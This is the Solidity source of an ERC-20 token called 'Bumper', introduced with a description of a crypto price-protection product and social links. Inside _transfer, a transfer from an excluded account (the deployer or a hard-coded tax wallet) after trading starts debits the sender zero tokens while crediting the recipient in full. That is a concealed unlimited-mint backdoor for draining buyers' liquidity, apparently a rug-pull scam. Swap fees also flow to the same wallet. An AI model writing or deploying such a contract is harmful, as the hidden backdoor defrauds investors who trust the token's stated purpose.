// SPDX-License-Identifier: Unlicensed

/**
Bumper is a risk management tool which provides price protection for crypto assets from downside volatility and market crashes. Although Bumper shares some similarities with Stop Losses, Options Desk and insurance policies, there are significant differences in Bumper's architecture, functionality and approach to managing risk.

Website: https://www.bumpfinance.org
Telegram: https://t.me/BumpFi_erc
Twitter: https://twitter.com/BumpFi_erc
Dapp: https://app.bumpfinance.org
 */

pragma solidity = 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address liquidityPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address liquidityPair);
    function createPair(address tokenA, address tokenB) external returns (address liquidityPair);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Bumper is Context, Ownable, IERC20 {

    string constant private _name = "Bumper";
    string constant private _symbol = "Bumper";
    uint8 constant private _decimals = 9;
    bool public tradeStarted = false;
    bool private inswap;
    bool private _maxTxNoEffect = false;

    address public liquidityPair;
    IUniswapRouterV2 public uniswapRouter;
    address payable private _taxWalletAddy;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedAccounts;
    mapping (address => bool) private _isSpecial;
    mapping (address => bool) private _isAmmPair;
    mapping (address => uint256) private balance;

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;
    uint256 constant public feeSwapThreshold = _totalSupply / 100_000;
    uint256 constant public feeDenominator = 1_000;
    uint256 public buyFeeDenominator = 200;
    uint256 public transferFeeDenominator = 0;
    uint256 public sellFeeDenominator = 200;
    uint256 private _maxTxSize = 25 * _totalSupply / 1000;
    bool private _feeSwapActivated = true;

    modifier inSwapFlag {
        inswap = true;
        _;
        inswap = false;
    }

    constructor () {
        uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _excludedAccounts[msg.sender] = true;
        _taxWalletAddy = payable(address(0xfBf824118bDcb3f7b20259485A6E0ce365ad8EF4));
        _excludedAccounts[_taxWalletAddy] = true;
        _isSpecial[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        liquidityPair = IUniswapFactoryV2(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _isAmmPair[liquidityPair] = true;
        _approve(msg.sender, address(uniswapRouter), type(uint256).max);
        _approve(address(this), address(uniswapRouter), type(uint256).max);
    }    
        
    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    
    function checkTxIfTransfer(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !_isAmmPair[out] && !_isAmmPair[ins];
        return _is_transfer;
    }
    function checkIfNoFee(address ins, address out) internal view returns (bool) {
        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !_isSpecial[ins]  && !_isSpecial[out] && out != address(0) && out != address(this);
            return isLimited;
    }
    
    function checkTxIfBuy(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_isAmmPair[out] && _isAmmPair[ins];
        return _is_buy;
    }

    function checkIfSell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _isAmmPair[out] && !_isAmmPair[ins];
        return _is_sell;
    }

    receive() external payable {}
    
    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "Couldnt approve on Zero Address");
        require(spender != address(0), "Couldnt approve on Zero Address");

        _allowances[sender][spender] = amount;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    
    function _getLastAmount(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = buyFeeDenominator;  else if (issell)  fee = sellFeeDenominator;  else  fee = transferFeeDenominator; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / feeDenominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return amount - feeAmount;
    }
    
    function swapFees(uint256 tokenAmount) internal inSwapFlag {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        if (_allowances[address(this)][address(uniswapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        }

        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) _taxWalletAddy.transfer(address(this).balance);
    } 
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function shouldSwapBackFee(address ins) internal view returns (bool) {
        bool canswap = _feeSwapActivated && !_excludedAccounts[ins];
        return canswap;
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "Cannot transfer to DEAD address");
        require(from != address(0), "Cannot transfer from DEAD address");
        require(amount > 0, "Transfer token amount must be greater than zero");

        if (checkIfNoFee(from,to)) {
            require(tradeStarted,"Trade is not started");
                    if(!_isAmmPair[to] && from != address(this) && to != address(this) || checkTxIfTransfer(from,to) && !_maxTxNoEffect)  { require(balanceOf(to) + amount <= _maxTxSize,"_maxTxSize exceed"); }}

        if(checkIfSell(from, to) &&  !inswap && shouldSwapBackFee(from)) {

            uint256 tokenAmount = balanceOf(address(this));
            if(tokenAmount >= feeSwapThreshold) { 
                if(amount > feeSwapThreshold) swapFees(tokenAmount);
             }
        }

        if (_excludedAccounts[from] || _excludedAccounts[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? _getLastAmount(from, checkTxIfBuy(from, to), checkIfSell(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!tradeStarted ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;
    }

    function enableTrading() external onlyOwner {
        require(!tradeStarted, "Already done start trading");
        tradeStarted = true;
    }
    
    function removeLimitsBeforeREnounce() external onlyOwner {
        require(!_maxTxNoEffect,"Already done remove limits");
        _maxTxSize = _totalSupply;
        _maxTxNoEffect = true;
        buyFeeDenominator = 10;
        sellFeeDenominator = 10;
    }
}